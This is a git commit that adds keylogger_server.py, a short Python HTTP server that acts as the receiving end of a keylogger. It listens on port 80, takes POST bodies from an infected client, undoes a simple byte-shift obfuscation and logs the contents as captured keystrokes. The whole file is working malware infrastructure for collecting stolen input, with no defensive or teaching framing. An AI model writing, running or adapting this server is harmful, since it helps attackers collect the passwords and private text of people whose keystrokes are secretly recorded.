63813669e9c05ea21db6491c937552386ff91486
CreatePhotonW <73783540+CreatePhotonW@users.noreply.github.com>
2021-01-15 01:11:48 -0600

    Create keylogger_server.py

---
+++ keylogger_server.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python3
+"""
+Very simple HTTP server in python for logging requests
+Usage::
+    ./server.py [<port>]
+"""
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+
+def decrypt_keys(enc_keys):
+    return bytes([x-1 for x in enc_keys])
+
+class S(BaseHTTPRequestHandler):
+    def _set_response(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_GET(self):
+        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
+        self._set_response()
+        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
+        post_data = self.rfile.read(content_length) # <--- Gets the data itself
+        if len(post_data):
+            logging.info("Recieved Logged Keys! \n%s\n", decrypt_keys(post_data).decode('ascii'))
+        self._set_response()
+
+def run(server_class=HTTPServer, handler_class=S, port=8080):
+    logging.basicConfig(level=logging.INFO)
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
+    logging.info('Starting keylogger server...\n')
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    httpd.server_close()
+    logging.info('Stopping keylogger server...\n')
+
+if __name__ == '__main__':
+    from sys import argv
+
+    PORT = 80
+
+    run(port=PORT)
+
+
